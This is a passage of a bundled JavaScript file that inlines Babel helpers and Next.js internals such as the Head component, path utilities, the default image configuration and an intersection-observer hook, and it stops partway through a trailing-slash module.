import * as React from 'react';
import React__default, { useState, useEffect, useLayoutEffect, createContext, forwardRef, useRef, Fragment, isValidElement, cloneElement, createElement, useContext, useMemo, useReducer, createRef, useCallback } from 'react';
import require$$0 from 'path';
import require$$1 from 'util';

function _arrayLikeToArray(r, a) {
  (null == a || a > r.length) && (a = r.length);
  for (var e = 0, n = Array(a); e < a; e++) n[e] = r[e];
  return n;
}
function _arrayWithHoles(r) {
  if (Array.isArray(r)) return r;
}
function _extends$3() {
  return _extends$3 = Object.assign ? Object.assign.bind() : function (n) {
    for (var e = 1; e < arguments.length; e++) {
      var t = arguments[e];
      for (var r in t) ({}).hasOwnProperty.call(t, r) && (n[r] = t[r]);
    }
    return n;
  }, _extends$3.apply(null, arguments);
}
function _iterableToArrayLimit(r, l) {
  var t = null == r ? null : "undefined" != typeof Symbol && r[Symbol.iterator] || r["@@iterator"];
  if (null != t) {
    var e,
      n,
      i,
      u,
      a = [],
      f = true,
      o = false;
    try {
      if (i = (t = t.call(r)).next, 0 === l) ; else for (; !(f = (e = i.call(t)).done) && (a.push(e.value), a.length !== l); f = !0);
    } catch (r) {
      o = true, n = r;
    } finally {
      try {
        if (!f && null != t.return && (u = t.return(), Object(u) !== u)) return;
      } finally {
        if (o) throw n;
      }
    }
    return a;
  }
}
function _nonIterableRest() {
  throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
}
function _objectWithoutProperties(e, t) {
  if (null == e) return {};
  var o,
    r,
    i = _objectWithoutPropertiesLoose(e, t);
  if (Object.getOwnPropertySymbols) {
    var n = Object.getOwnPropertySymbols(e);
    for (r = 0; r < n.length; r++) o = n[r], -1 === t.indexOf(o) && {}.propertyIsEnumerable.call(e, o) && (i[o] = e[o]);
  }
  return i;
}
function _objectWithoutPropertiesLoose(r, e) {
  if (null == r) return {};
  var t = {};
  for (var n in r) if ({}.hasOwnProperty.call(r, n)) {
    if (-1 !== e.indexOf(n)) continue;
    t[n] = r[n];
  }
  return t;
}
function _slicedToArray(r, e) {
  return _arrayWithHoles(r) || _iterableToArrayLimit(r, e) || _unsupportedIterableToArray(r, e) || _nonIterableRest();
}
function _unsupportedIterableToArray(r, a) {
  if (r) {
    if ("string" == typeof r) return _arrayLikeToArray(r, a);
    var t = {}.toString.call(r).slice(8, -1);
    return "Object" === t && r.constructor && (t = r.constructor.name), "Map" === t || "Set" === t ? Array.from(r) : "Arguments" === t || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(t) ? _arrayLikeToArray(r, a) : void 0;
  }
}

var commonjsGlobal = typeof globalThis !== 'undefined' ? globalThis : typeof window !== 'undefined' ? window : typeof global !== 'undefined' ? global : typeof self !== 'undefined' ? self : {};

function getDefaultExportFromCjs (x) {
	return x && x.__esModule && Object.prototype.hasOwnProperty.call(x, 'default') ? x['default'] : x;
}

var image$1 = {exports: {}};

var _extends$2 = {};

var hasRequired_extends;

function require_extends () {
	if (hasRequired_extends) return _extends$2;
	hasRequired_extends = 1;
	Object.defineProperty(_extends$2, "__esModule", {
	    value: true
	});
	_extends$2.default = _extends;
	function _extends() {
	    return extends_.apply(this, arguments);
	}
	function extends_() {
	    extends_ = Object.assign || function(target) {
	        for(var i = 1; i < arguments.length; i++){
	            var source = arguments[i];
	            for(var key in source){
	                if (Object.prototype.hasOwnProperty.call(source, key)) {
	                    target[key] = source[key];
	                }
	            }
	        }
	        return target;
	    };
	    return extends_.apply(this, arguments);
	}
	return _extends$2;
}

var _interop_require_default = {};

var hasRequired_interop_require_default;

function require_interop_require_default () {
	if (hasRequired_interop_require_default) return _interop_require_default;
	hasRequired_interop_require_default = 1;
	Object.defineProperty(_interop_require_default, "__esModule", {
	    value: true
	});
	_interop_require_default.default = _interopRequireDefault;
	function _interopRequireDefault(obj) {
	    return obj && obj.__esModule ? obj : {
	        default: obj
	    };
	}
	return _interop_require_default;
}

var _interop_require_wildcard = {};

var hasRequired_interop_require_wildcard;

function require_interop_require_wildcard () {
	if (hasRequired_interop_require_wildcard) return _interop_require_wildcard;
	hasRequired_interop_require_wildcard = 1;
	Object.defineProperty(_interop_require_wildcard, "__esModule", {
	    value: true
	});
	_interop_require_wildcard.default = _interopRequireWildcard;
	function _interopRequireWildcard(obj, nodeInterop) {
	    if (!nodeInterop && obj && obj.__esModule) {
	        return obj;
	    }
	    if (obj === null || typeof obj !== "object" && typeof obj !== "function") {
	        return {
	            default: obj
	        };
	    }
	    var cache = _getRequireWildcardCache(nodeInterop);
	    if (cache && cache.has(obj)) {
	        return cache.get(obj);
	    }
	    var newObj = {};
	    var hasPropertyDescriptor = Object.defineProperty && Object.getOwnPropertyDescriptor;
	    for(var key in obj){
	        if (key !== "default" && Object.prototype.hasOwnProperty.call(obj, key)) {
	            var desc = hasPropertyDescriptor ? Object.getOwnPropertyDescriptor(obj, key) : null;
	            if (desc && (desc.get || desc.set)) {
	                Object.defineProperty(newObj, key, desc);
	            } else {
	                newObj[key] = obj[key];
	            }
	        }
	    }
	    newObj.default = obj;
	    if (cache) {
	        cache.set(obj, newObj);
	    }
	    return newObj;
	}
	function _getRequireWildcardCache(nodeInterop1) {
	    if (typeof WeakMap !== "function") return null;
	    var cacheBabelInterop = new WeakMap();
	    var cacheNodeInterop = new WeakMap();
	    return (_getRequireWildcardCache = function(nodeInterop) {
	        return nodeInterop ? cacheNodeInterop : cacheBabelInterop;
	    })(nodeInterop1);
	}
	return _interop_require_wildcard;
}

var _object_without_properties_loose = {};

var hasRequired_object_without_properties_loose;

function require_object_without_properties_loose () {
	if (hasRequired_object_without_properties_loose) return _object_without_properties_loose;
	hasRequired_object_without_properties_loose = 1;
	Object.defineProperty(_object_without_properties_loose, "__esModule", {
	    value: true
	});
	_object_without_properties_loose.default = _objectWithoutPropertiesLoose;
	function _objectWithoutPropertiesLoose(source, excluded) {
	    if (source == null) return {};
	    var target = {};
	    var sourceKeys = Object.keys(source);
	    var key, i;
	    for(i = 0; i < sourceKeys.length; i++){
	        key = sourceKeys[i];
	        if (excluded.indexOf(key) >= 0) continue;
	        target[key] = source[key];
	    }
	    return target;
	}
	return _object_without_properties_loose;
}

var head = {exports: {}};

var sideEffect = {};

var hasRequiredSideEffect;

function requireSideEffect () {
	if (hasRequiredSideEffect) return sideEffect;
	hasRequiredSideEffect = 1;
	Object.defineProperty(sideEffect, "__esModule", {
	    value: true
	});
	sideEffect.default = SideEffect;
	var _interop_require_wildcard = /*@__PURE__*/ require_interop_require_wildcard().default;
	var _react = _interop_require_wildcard(React__default);
	function SideEffect(props) {
	    const { headManager , reduceComponentsToState  } = props;
	    function emitChange() {
	        if (headManager && headManager.mountedInstances) {
	            const headElements = _react.Children.toArray(Array.from(headManager.mountedInstances).filter(Boolean));
	            headManager.updateHead(reduceComponentsToState(headElements, props));
	        }
	    }
	    if (isServer) {
	        var ref;
	        headManager == null ? void 0 : (ref = headManager.mountedInstances) == null ? void 0 : ref.add(props.children);
	        emitChange();
	    }
	    useClientOnlyLayoutEffect(()=>{
	        var ref1;
	        headManager == null ? void 0 : (ref1 = headManager.mountedInstances) == null ? void 0 : ref1.add(props.children);
	        return ()=>{
	            var ref;
	            headManager == null ? void 0 : (ref = headManager.mountedInstances) == null ? void 0 : ref.delete(props.children);
	        };
	    });
	    // We need to call `updateHead` method whenever the `SideEffect` is trigger in all
	    // life-cycles: mount, update, unmount. However, if there are multiple `SideEffect`s
	    // being rendered, we only trigger the method from the last one.
	    // This is ensured by keeping the last unflushed `updateHead` in the `_pendingUpdate`
	    // singleton in the layout effect pass, and actually trigger it in the effect pass.
	    useClientOnlyLayoutEffect(()=>{
	        if (headManager) {
	            headManager._pendingUpdate = emitChange;
	        }
	        return ()=>{
	            if (headManager) {
	                headManager._pendingUpdate = emitChange;
	            }
	        };
	    });
	    useClientOnlyEffect(()=>{
	        if (headManager && headManager._pendingUpdate) {
	            headManager._pendingUpdate();
	            headManager._pendingUpdate = null;
	        }
	        return ()=>{
	            if (headManager && headManager._pendingUpdate) {
	                headManager._pendingUpdate();
	                headManager._pendingUpdate = null;
	            }
	        };
	    });
	    return null;
	}
	const isServer = typeof window === 'undefined';
	const useClientOnlyLayoutEffect = isServer ? ()=>{} : _react.useLayoutEffect;
	const useClientOnlyEffect = isServer ? ()=>{} : _react.useEffect;

	
	return sideEffect;
}

var ampContext = {};

var hasRequiredAmpContext;

function requireAmpContext () {
	if (hasRequiredAmpContext) return ampContext;
	hasRequiredAmpContext = 1;
	Object.defineProperty(ampContext, "__esModule", {
	    value: true
	});
	ampContext.AmpStateContext = void 0;
	var _interop_require_default = /*@__PURE__*/ require_interop_require_default().default;
	var _react = _interop_require_default(React__default);
	const AmpStateContext = _react.default.createContext({});
	ampContext.AmpStateContext = AmpStateContext;
	if (process.env.NODE_ENV !== 'production') {
	    AmpStateContext.displayName = 'AmpStateContext';
	}

	
	return ampContext;
}

var headManagerContext = {};

var hasRequiredHeadManagerContext;

function requireHeadManagerContext () {
	if (hasRequiredHeadManagerContext) return headManagerContext;
	hasRequiredHeadManagerContext = 1;
	Object.defineProperty(headManagerContext, "__esModule", {
	    value: true
	});
	headManagerContext.HeadManagerContext = void 0;
	var _interop_require_default = /*@__PURE__*/ require_interop_require_default().default;
	var _react = _interop_require_default(React__default);
	const HeadManagerContext = _react.default.createContext({});
	headManagerContext.HeadManagerContext = HeadManagerContext;
	if (process.env.NODE_ENV !== 'production') {
	    HeadManagerContext.displayName = 'HeadManagerContext';
	}

	
	return headManagerContext;
}

var ampMode = {};

var hasRequiredAmpMode;

function requireAmpMode () {
	if (hasRequiredAmpMode) return ampMode;
	hasRequiredAmpMode = 1;
	Object.defineProperty(ampMode, "__esModule", {
	    value: true
	});
	ampMode.isInAmpMode = isInAmpMode;
	function isInAmpMode({ ampFirst =false , hybrid =false , hasQuery =false ,  } = {}) {
	    return ampFirst || hybrid && hasQuery;
	}

	
	return ampMode;
}

var utils$1 = {};

var _async_to_generator = {};

var hasRequired_async_to_generator;

function require_async_to_generator () {
	if (hasRequired_async_to_generator) return _async_to_generator;
	hasRequired_async_to_generator = 1;
	Object.defineProperty(_async_to_generator, "__esModule", {
	    value: true
	});
	_async_to_generator.default = _asyncToGenerator;
	function _asyncToGenerator(fn) {
	    return function() {
	        var self = this, args = arguments;
	        return new Promise(function(resolve, reject) {
	            var gen = fn.apply(self, args);
	            function _next(value) {
	                asyncGeneratorStep(gen, resolve, reject, _next, _throw, "next", value);
	            }
	            function _throw(err) {
	                asyncGeneratorStep(gen, resolve, reject, _next, _throw, "throw", err);
	            }
	            _next(undefined);
	        });
	    };
	}
	function asyncGeneratorStep(gen, resolve, reject, _next, _throw, key, arg) {
	    try {
	        var info = gen[key](arg);
	        var value = info.value;
	    } catch (error) {
	        reject(error);
	        return;
	    }
	    if (info.done) {
	        resolve(value);
	    } else {
	        Promise.resolve(value).then(_next, _throw);
	    }
	}
	return _async_to_generator;
}

var hasRequiredUtils$1;

function requireUtils$1 () {
	if (hasRequiredUtils$1) return utils$1;
	hasRequiredUtils$1 = 1;
	Object.defineProperty(utils$1, "__esModule", {
	    value: true
	});
	utils$1.execOnce = execOnce;
	utils$1.getLocationOrigin = getLocationOrigin;
	utils$1.getURL = getURL;
	utils$1.getDisplayName = getDisplayName;
	utils$1.isResSent = isResSent;
	utils$1.normalizeRepeatedSlashes = normalizeRepeatedSlashes;
	utils$1.loadGetInitialProps = loadGetInitialProps;
	utils$1.ST = utils$1.SP = utils$1.warnOnce = utils$1.isAbsoluteUrl = void 0;
	var _async_to_generator = /*@__PURE__*/ require_async_to_generator().default;
	function execOnce(fn) {
	    let used = false;
	    let result;
	    return (...args)=>{
	        if (!used) {
	            used = true;
	            result = fn(...args);
	        }
	        return result;
	    };
	}
	// Scheme: https://tools.ietf.org/html/rfc3986#section-3.1
	// Absolute URL: https://tools.ietf.org/html/rfc3986#section-4.3
	const ABSOLUTE_URL_REGEX = /^[a-zA-Z][a-zA-Z\d+\-.]*?:/;
	const isAbsoluteUrl = (url)=>ABSOLUTE_URL_REGEX.test(url);
	utils$1.isAbsoluteUrl = isAbsoluteUrl;
	function getLocationOrigin() {
	    const { protocol , hostname , port  } = window.location;
	    return `${protocol}//${hostname}${port ? ':' + port : ''}`;
	}
	function getURL() {
	    const { href  } = window.location;
	    const origin = getLocationOrigin();
	    return href.substring(origin.length);
	}
	function getDisplayName(Component) {
	    return typeof Component === 'string' ? Component : Component.displayName || Component.name || 'Unknown';
	}
	function isResSent(res) {
	    return res.finished || res.headersSent;
	}
	function normalizeRepeatedSlashes(url) {
	    const urlParts = url.split('?');
	    const urlNoQuery = urlParts[0];
	    return urlNoQuery// first we replace any non-encoded backslashes with forward
	    // then normalize repeated forward slashes
	    .replace(/\\/g, '/').replace(/\/\/+/g, '/') + (urlParts[1] ? `?${urlParts.slice(1).join('?')}` : '');
	}
	function loadGetInitialProps(App, ctx) {
	    return _loadGetInitialProps.apply(this, arguments);
	}
	function _loadGetInitialProps() {
	    _loadGetInitialProps = _async_to_generator(function*(App, ctx) {
	        if (process.env.NODE_ENV !== 'production') {
	            var ref;
	            if ((ref = App.prototype) == null ? void 0 : ref.getInitialProps) {
	                const message = `"${getDisplayName(App)}.getInitialProps()" is defined as an instance method - visit https://nextjs.org/docs/messages/get-initial-props-as-an-instance-method for more information.`;
	                throw new Error(message);
	            }
	        }
	        // when called from _app `ctx` is nested in `ctx`
	        const res = ctx.res || ctx.ctx && ctx.ctx.res;
	        if (!App.getInitialProps) {
	            if (ctx.ctx && ctx.Component) {
	                // @ts-ignore pageProps default
	                return {
	                    pageProps: yield loadGetInitialProps(ctx.Component, ctx.ctx)
	                };
	            }
	            return {};
	        }
	        const props = yield App.getInitialProps(ctx);
	        if (res && isResSent(res)) {
	            return props;
	        }
	        if (!props) {
	            const message = `"${getDisplayName(App)}.getInitialProps()" should resolve to an object. But found "${props}" instead.`;
	            throw new Error(message);
	        }
	        if (process.env.NODE_ENV !== 'production') {
	            if (Object.keys(props).length === 0 && !ctx.ctx) {
	                console.warn(`${getDisplayName(App)} returned an empty object from \`getInitialProps\`. This de-optimizes and prevents automatic static optimization. https://nextjs.org/docs/messages/empty-object-getInitialProps`);
	            }
	        }
	        return props;
	    });
	    return _loadGetInitialProps.apply(this, arguments);
	}
	let warnOnce = (_)=>{};
	if (process.env.NODE_ENV !== 'production') {
	    const warnings = new Set();
	    utils$1.warnOnce = warnOnce = (msg)=>{
	        if (!warnings.has(msg)) {
	            console.warn(msg);
	        }
	        warnings.add(msg);
	    };
	}
	const SP = typeof performance !== 'undefined';
	utils$1.SP = SP;
	const ST = SP && [
	    'mark',
	    'measure',
	    'getEntriesByName'
	].every((method)=>typeof performance[method] === 'function');
	utils$1.ST = ST;
	class DecodeError extends Error {
	}
	utils$1.DecodeError = DecodeError;
	class NormalizeError extends Error {
	}
	utils$1.NormalizeError = NormalizeError;
	class PageNotFoundError extends Error {
	    constructor(page){
	        super();
	        this.code = 'ENOENT';
	        this.message = `Cannot find module for page: ${page}`;
	    }
	}
	utils$1.PageNotFoundError = PageNotFoundError;
	class MissingStaticPage extends Error {
	    constructor(page, message){
	        super();
	        this.message = `Failed to load static file for page: ${page} ${message}`;
	    }
	}
	utils$1.MissingStaticPage = MissingStaticPage;
	class MiddlewareNotFoundError extends Error {
	    constructor(){
	        super();
	        this.code = 'ENOENT';
	        this.message = `Cannot find the middleware module`;
	    }
	}
	utils$1.MiddlewareNotFoundError = MiddlewareNotFoundError;
	utils$1.warnOnce = warnOnce;

	
	return utils$1;
}

var hasRequiredHead;

function requireHead () {
	if (hasRequiredHead) return head.exports;
	hasRequiredHead = 1;
	(function (module, exports) {
		"client";
		Object.defineProperty(exports, "__esModule", {
		    value: true
		});
		exports.defaultHead = defaultHead;
		exports.default = void 0;
		var _extends = /*@__PURE__*/ require_extends().default;
		var _interop_require_default = /*@__PURE__*/ require_interop_require_default().default;
		var _interop_require_wildcard = /*@__PURE__*/ require_interop_require_wildcard().default;
		var _react = _interop_require_wildcard(React__default);
		var _sideEffect = _interop_require_default(requireSideEffect());
		var _ampContext = requireAmpContext();
		var _headManagerContext = requireHeadManagerContext();
		var _ampMode = requireAmpMode();
		var _utils = requireUtils$1();
		function defaultHead(inAmpMode = false) {
		    const head = [
		        /*#__PURE__*/ _react.default.createElement("meta", {
		            charSet: "utf-8"
		        })
		    ];
		    if (!inAmpMode) {
		        head.push(/*#__PURE__*/ _react.default.createElement("meta", {
		            name: "viewport",
		            content: "width=device-width"
		        }));
		    }
		    return head;
		}
		function onlyReactElement(list, child) {
		    // React children can be "string" or "number" in this case we ignore them for backwards compat
		    if (typeof child === 'string' || typeof child === 'number') {
		        return list;
		    }
		    // Adds support for React.Fragment
		    if (child.type === _react.default.Fragment) {
		        return list.concat(_react.default.Children.toArray(child.props.children).reduce((fragmentList, fragmentChild)=>{
		            if (typeof fragmentChild === 'string' || typeof fragmentChild === 'number') {
		                return fragmentList;
		            }
		            return fragmentList.concat(fragmentChild);
		        }, []));
		    }
		    return list.concat(child);
		}
		const METATYPES = [
		    'name',
		    'httpEquiv',
		    'charSet',
		    'itemProp'
		];
		/*
		 returns a function for filtering head child elements
		 which shouldn't be duplicated, like <title/>
		 Also adds support for deduplicated `key` properties
		*/ function unique() {
		    const keys = new Set();
		    const tags = new Set();
		    const metaTypes = new Set();
		    const metaCategories = {};
		    return (h)=>{
		        let isUnique = true;
		        let hasKey = false;
		        if (h.key && typeof h.key !== 'number' && h.key.indexOf('$') > 0) {
		            hasKey = true;
		            const key = h.key.slice(h.key.indexOf('$') + 1);
		            if (keys.has(key)) {
		                isUnique = false;
		            } else {
		                keys.add(key);
		            }
		        }
		        // eslint-disable-next-line default-case
		        switch(h.type){
		            case 'title':
		            case 'base':
		                if (tags.has(h.type)) {
		                    isUnique = false;
		                } else {
		                    tags.add(h.type);
		                }
		                break;
		            case 'meta':
		                for(let i = 0, len = METATYPES.length; i < len; i++){
		                    const metatype = METATYPES[i];
		                    if (!h.props.hasOwnProperty(metatype)) continue;
		                    if (metatype === 'charSet') {
		                        if (metaTypes.has(metatype)) {
		                            isUnique = false;
		                        } else {
		                            metaTypes.add(metatype);
		                        }
		                    } else {
		                        const category = h.props[metatype];
		                        const categories = metaCategories[metatype] || new Set();
		                        if ((metatype !== 'name' || !hasKey) && categories.has(category)) {
		                            isUnique = false;
		                        } else {
		                            categories.add(category);
		                            metaCategories[metatype] = categories;
		                        }
		                    }
		                }
		                break;
		        }
		        return isUnique;
		    };
		}
		/**
		 *
		 * @param headChildrenElements List of children of <Head>
		 */ function reduceComponents(headChildrenElements, props) {
		    const { inAmpMode  } = props;
		    return headChildrenElements.reduce(onlyReactElement, []).reverse().concat(defaultHead(inAmpMode).reverse()).filter(unique()).reverse().map((c, i)=>{
		        const key = c.key || i;
		        if (process.env.NODE_ENV !== 'development' && process.env.__NEXT_OPTIMIZE_FONTS && !inAmpMode) {
		            if (c.type === 'link' && c.props['href'] && // TODO(prateekbh@): Replace this with const from `constants` when the tree shaking works.
		            [
		                'https://fonts.googleapis.com/css',
		                'https://use.typekit.net/'
		            ].some((url)=>c.props['href'].startsWith(url))) {
		                const newProps = _extends({}, c.props || {});
		                newProps['data-href'] = newProps['href'];
		                newProps['href'] = undefined;
		                // Add this attribute to make it easy to identify optimized tags
		                newProps['data-optimized-fonts'] = true;
		                return /*#__PURE__*/ _react.default.cloneElement(c, newProps);
		            }
		        }
		        if (process.env.NODE_ENV === 'development' && process.env.__NEXT_REACT_ROOT) {
		            // omit JSON-LD structured data snippets from the warning
		            if (c.type === 'script' && c.props['type'] !== 'application/ld+json') {
		                const srcMessage = c.props['src'] ? `<script> tag with src="${c.props['src']}"` : `inline <script>`;
		                (_utils).warnOnce(`Do not add <script> tags using next/head (see ${srcMessage}). Use next/script instead. \nSee more info here: https://nextjs.org/docs/messages/no-script-tags-in-head-component`);
		            } else if (c.type === 'link' && c.props['rel'] === 'stylesheet') {
		                (_utils).warnOnce(`Do not add stylesheets using next/head (see <link rel="stylesheet"> tag with href="${c.props['href']}"). Use Document instead. \nSee more info here: https://nextjs.org/docs/messages/no-stylesheets-in-head-component`);
		            }
		        }
		        return /*#__PURE__*/ _react.default.cloneElement(c, {
		            key
		        });
		    });
		}
		/**
		 * This component injects elements to `<head>` of your page.
		 * To avoid duplicated `tags` in `<head>` you can use the `key` property, which will make sure every tag is only rendered once.
		 */ function Head({ children  }) {
		    const ampState = (_react).useContext(_ampContext.AmpStateContext);
		    const headManager = (_react).useContext(_headManagerContext.HeadManagerContext);
		    return /*#__PURE__*/ _react.default.createElement(_sideEffect.default, {
		        reduceComponentsToState: reduceComponents,
		        headManager: headManager,
		        inAmpMode: (_ampMode).isInAmpMode(ampState)
		    }, children);
		}
		var _default = Head;
		exports.default = _default;

		if ((typeof exports.default === 'function' || (typeof exports.default === 'object' && exports.default !== null)) && typeof exports.default.__esModule === 'undefined') {
		  Object.defineProperty(exports.default, '__esModule', { value: true });
		  Object.assign(exports.default, exports);
		  module.exports = exports.default;
		}

		
	} (head, head.exports));
	return head.exports;
}

var imageConfig = {};

var hasRequiredImageConfig;

function requireImageConfig () {
	if (hasRequiredImageConfig) return imageConfig;
	hasRequiredImageConfig = 1;
	Object.defineProperty(imageConfig, "__esModule", {
	    value: true
	});
	imageConfig.imageConfigDefault = imageConfig.VALID_LOADERS = void 0;
	const VALID_LOADERS = [
	    'default',
	    'imgix',
	    'cloudinary',
	    'akamai',
	    'custom', 
	];
	imageConfig.VALID_LOADERS = VALID_LOADERS;
	const imageConfigDefault = {
	    deviceSizes: [
	        640,
	        750,
	        828,
	        1080,
	        1200,
	        1920,
	        2048,
	        3840
	    ],
	    imageSizes: [
	        16,
	        32,
	        48,
	        64,
	        96,
	        128,
	        256,
	        384
	    ],
	    path: '/_next/image',
	    loader: 'default',
	    domains: [],
	    disableStaticImages: false,
	    minimumCacheTTL: 60,
	    formats: [
	        'image/webp'
	    ],
	    dangerouslyAllowSVG: false,
	    contentSecurityPolicy: `script-src 'none'; frame-src 'none'; sandbox;`,
	    remotePatterns: [],
	    unoptimized: false
	};
	imageConfig.imageConfigDefault = imageConfigDefault;

	
	return imageConfig;
}

var useIntersection = {exports: {}};

var requestIdleCallback = {exports: {}};

var hasRequiredRequestIdleCallback;

function requireRequestIdleCallback () {
	if (hasRequiredRequestIdleCallback) return requestIdleCallback.exports;
	hasRequiredRequestIdleCallback = 1;
	(function (module, exports) {
		Object.defineProperty(exports, "__esModule", {
		    value: true
		});
		exports.cancelIdleCallback = exports.requestIdleCallback = void 0;
		const requestIdleCallback = typeof self !== 'undefined' && self.requestIdleCallback && self.requestIdleCallback.bind(window) || function(cb) {
		    let start = Date.now();
		    return setTimeout(function() {
		        cb({
		            didTimeout: false,
		            timeRemaining: function() {
		                return Math.max(0, 50 - (Date.now() - start));
		            }
		        });
		    }, 1);
		};
		exports.requestIdleCallback = requestIdleCallback;
		const cancelIdleCallback = typeof self !== 'undefined' && self.cancelIdleCallback && self.cancelIdleCallback.bind(window) || function(id) {
		    return clearTimeout(id);
		};
		exports.cancelIdleCallback = cancelIdleCallback;

		if ((typeof exports.default === 'function' || (typeof exports.default === 'object' && exports.default !== null)) && typeof exports.default.__esModule === 'undefined') {
		  Object.defineProperty(exports.default, '__esModule', { value: true });
		  Object.assign(exports.default, exports);
		  module.exports = exports.default;
		}

		
	} (requestIdleCallback, requestIdleCallback.exports));
	return requestIdleCallback.exports;
}

var hasRequiredUseIntersection;

function requireUseIntersection () {
	if (hasRequiredUseIntersection) return useIntersection.exports;
	hasRequiredUseIntersection = 1;
	(function (module, exports) {
		Object.defineProperty(exports, "__esModule", {
		    value: true
		});
		exports.useIntersection = useIntersection;
		var _react = React__default;
		var _requestIdleCallback = requireRequestIdleCallback();
		const hasIntersectionObserver = typeof IntersectionObserver === 'function';
		const observers = new Map();
		const idList = [];
		function createObserver(options) {
		    const id = {
		        root: options.root || null,
		        margin: options.rootMargin || ''
		    };
		    const existing = idList.find((obj)=>obj.root === id.root && obj.margin === id.margin);
		    let instance;
		    if (existing) {
		        instance = observers.get(existing);
		        if (instance) {
		            return instance;
		        }
		    }
		    const elements = new Map();
		    const observer = new IntersectionObserver((entries)=>{
		        entries.forEach((entry)=>{
		            const callback = elements.get(entry.target);
		            const isVisible = entry.isIntersecting || entry.intersectionRatio > 0;
		            if (callback && isVisible) {
		                callback(isVisible);
		            }
		        });
		    }, options);
		    instance = {
		        id,
		        observer,
		        elements
		    };
		    idList.push(id);
		    observers.set(id, instance);
		    return instance;
		}
		function observe(element, callback, options) {
		    const { id , observer , elements  } = createObserver(options);
		    elements.set(element, callback);
		    observer.observe(element);
		    return function unobserve() {
		        elements.delete(element);
		        observer.unobserve(element);
		        // Destroy observer when there's nothing left to watch:
		        if (elements.size === 0) {
		            observer.disconnect();
		            observers.delete(id);
		            const index = idList.findIndex((obj)=>obj.root === id.root && obj.margin === id.margin);
		            if (index > -1) {
		                idList.splice(index, 1);
		            }
		        }
		    };
		}
		function useIntersection({ rootRef , rootMargin , disabled  }) {
		    const isDisabled = disabled || !hasIntersectionObserver;
		    const [visible, setVisible] = (_react).useState(false);
		    const [element, setElement] = (_react).useState(null);
		    (_react).useEffect(()=>{
		        if (hasIntersectionObserver) {
		            if (isDisabled || visible) return;
		            if (element && element.tagName) {
		                const unobserve = observe(element, (isVisible)=>isVisible && setVisible(isVisible), {
		                    root: rootRef == null ? void 0 : rootRef.current,
		                    rootMargin
		                });
		                return unobserve;
		            }
		        } else {
		            if (!visible) {
		                const idleCallback = (_requestIdleCallback).requestIdleCallback(()=>setVisible(true));
		                return ()=>(_requestIdleCallback).cancelIdleCallback(idleCallback);
		            }
		        }
		    }, [
		        element,
		        isDisabled,
		        rootMargin,
		        rootRef,
		        visible
		    ]);
		    const resetVisible = (_react).useCallback(()=>{
		        setVisible(false);
		    }, []);
		    return [
		        setElement,
		        visible,
		        resetVisible
		    ];
		}

		if ((typeof exports.default === 'function' || (typeof exports.default === 'object' && exports.default !== null)) && typeof exports.default.__esModule === 'undefined') {
		  Object.defineProperty(exports.default, '__esModule', { value: true });
		  Object.assign(exports.default, exports);
		  module.exports = exports.default;
		}

		
	} (useIntersection, useIntersection.exports));
	return useIntersection.exports;
}

var imageConfigContext = {};

var hasRequiredImageConfigContext;

function requireImageConfigContext () {
	if (hasRequiredImageConfigContext) return imageConfigContext;
	hasRequiredImageConfigContext = 1;
	Object.defineProperty(imageConfigContext, "__esModule", {
	    value: true
	});
	imageConfigContext.ImageConfigContext = void 0;
	var _interop_require_default = /*@__PURE__*/ require_interop_require_default().default;
	var _react = _interop_require_default(React__default);
	var _imageConfig = requireImageConfig();
	const ImageConfigContext = _react.default.createContext(_imageConfig.imageConfigDefault);
	imageConfigContext.ImageConfigContext = ImageConfigContext;
	if (process.env.NODE_ENV !== 'production') {
	    ImageConfigContext.displayName = 'ImageConfigContext';
	}

	
	return imageConfigContext;
}

var normalizeTrailingSlash = {exports: {}};

var removeTrailingSlash = {};

var hasRequiredRemoveTrailingSlash;

function requireRemoveTrailingSlash () {
	if (hasRequiredRemoveTrailingSlash) return removeTrailingSlash;
	hasRequiredRemoveTrailingSlash = 1;
	Object.defineProperty(removeTrailingSlash, "__esModule", {
	    value: true
	});
	removeTrailingSlash.removeTrailingSlash = removeTrailingSlash$1;
	function removeTrailingSlash$1(route) {
	    return route.replace(/\/$/, '') || '/';
	}

	
	return removeTrailingSlash;
}

var parsePath = {};

var hasRequiredParsePath;

function requireParsePath () {
	if (hasRequiredParsePath) return parsePath;
	hasRequiredParsePath = 1;
	Object.defineProperty(parsePath, "__esModule", {
	    value: true
	});
	parsePath.parsePath = parsePath$1;
	function parsePath$1(path) {
	    const hashIndex = path.indexOf('#');
	    const queryIndex = path.indexOf('?');
	    const hasQuery = queryIndex > -1 && (hashIndex < 0 || queryIndex < hashIndex);
	    if (hasQuery || hashIndex > -1) {
	        return {
	            pathname: path.substring(0, hasQuery ? queryIndex : hashIndex),
	            query: hasQuery ? path.substring(queryIndex, hashIndex > -1 ? hashIndex : undefined) : '',
	            hash: hashIndex > -1 ? path.slice(hashIndex) : ''
	        };
	    }
	    return {
	        pathname: path,
	        query: '',
	        hash: ''
	    };
	}

	
	return parsePath;
}

var hasRequiredNormalizeTrailingSlash;

function requireNormalizeTrailingSlash () {
	if (hasRequiredNormalizeTrailingSlash) return normalizeTrailingSlash.exports;
	hasRequiredNormalizeTrailingSlash = 1;
	(function (module, exports) {
		Object.defineProperty(exports, "__esModule", {
		    value: true
		});
		exports.normalizePathTrailingSlash = void 0;
		var _removeTrailingSlash = requireRemoveTrailingSlash();
		var _parsePath = requireParsePath();
		const normalizePathTrailingSlash = (path)=>{
		    if (!path.startsWith('/') || process.env.__NEXT_MANUAL_TRAILING_SLASH) {
		        return path;
		    }
		    const { pathname , query , hash  } = (_parsePath).parsePath(path);
		    if (process.env.__NEXT_TRAILING_SLASH) {
		        if (/\.[^/]+\/?$/.test(pathname)) {
		            return `${(_removeTrailingSlash).removeTrailingSlash(pathname)}${query}${hash}`;
		        } else if (pathname.endsWith('/')) {
		            return `${pathname}${query}${hash}`;
		        } else {
		            return `${pathname}/${query}${hash}`;
		        }
		    }
		    return `${(_removeTrailingSlash).removeTrailingSlash(pathname)}${query}${hash}`;
		};
		exports.normalizePathTrailingSlash = normalizePathTrailingSlash;

		if ((typeof exports.default === 'function' || (typeof exports.default === 'object' && exports.default !== null)) && typeof exports.default.__esModule === 'undefined') {
		  Object.defineProperty(exports.default, '__esModule', { value: true });
		  Object.assign(exports.default, exports);
		  module.exports = exports.default;
		}

		
	} (normalizeTrailingSlash, normalizeTrailingSlash.exports));
